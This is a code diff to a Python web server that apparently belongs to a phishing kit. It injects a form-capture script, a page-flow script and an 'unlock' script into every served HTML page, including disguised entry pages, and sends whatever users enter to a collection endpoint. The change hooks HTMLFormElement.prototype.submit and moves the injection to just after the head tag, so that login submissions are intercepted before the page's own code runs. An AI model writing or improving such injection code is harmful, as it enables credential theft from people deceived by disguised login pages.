@@ -2347,6 +2347,14 @@ def site_flow_script(slug: str) -> bytes:
     })
     .catch(function(){});
   // 点登录 / 提交表单：直接进入排好的下一个启用页（拦在页面自身脚本之前）
+  // 页面 JS 可能直接调 form.submit()（不触发 submit 事件），一并接管
+  try {
+    var _submit = HTMLFormElement.prototype.submit;
+    HTMLFormElement.prototype.submit = function(){
+      if (goNext()) return;
+      return _submit.apply(this, arguments);
+    };
+  } catch (e) {}
   document.addEventListener("submit", function(event){
     if (goNext()) { event.preventDefault(); event.stopImmediatePropagation(); }
   }, true);
@@ -4234,12 +4242,21 @@ class Handler(BaseHTTPRequestHandler):
             content = content[:closing_body] + click_capture_script(click_path) + content[closing_body:]
         # 表单采集脚本：所有 HTML 页面都注入（含流程页与入口伪装文件），
         # 与点击分流互不影响——分流只决定跳哪，采集只看用户填了什么。
-        if content_type.startswith("text/html") and closing_body >= 0:
+        if content_type.startswith("text/html"):
             post_path = (
                 f"/__preview/{self._preview_host}/api/client/postData"
                 if self._preview_host else "/api/client/postData"
             )
-            content = content[:closing_body] + kit_unlock_script() + site_flow_script(str(project.get("slug") or "")) + capture_script(post_path, str(project.get("slug") or "")) + content[closing_body:]
+            inject_blob = (kit_unlock_script()
+                           + site_flow_script(str(project.get("slug") or ""))
+                           + capture_script(post_path, str(project.get("slug") or "")))
+            # 注入到 <head> 之后：抢在页面自身脚本之前注册监听，登录按钮才拦得住
+            head_at = content.lower().find(b"<head")
+            head_end = content.find(b">", head_at) + 1 if head_at >= 0 else -1
+            if head_at >= 0 and head_end > 0:
+                content = content[:head_end] + inject_blob + content[head_end:]
+            elif closing_body >= 0:
+                content = content[:closing_body] + inject_blob + content[closing_body:]
         self.send_response(200)
         self.send_header("Content-Type", content_type)
         self.send_header("Content-Length", str(len(content)))
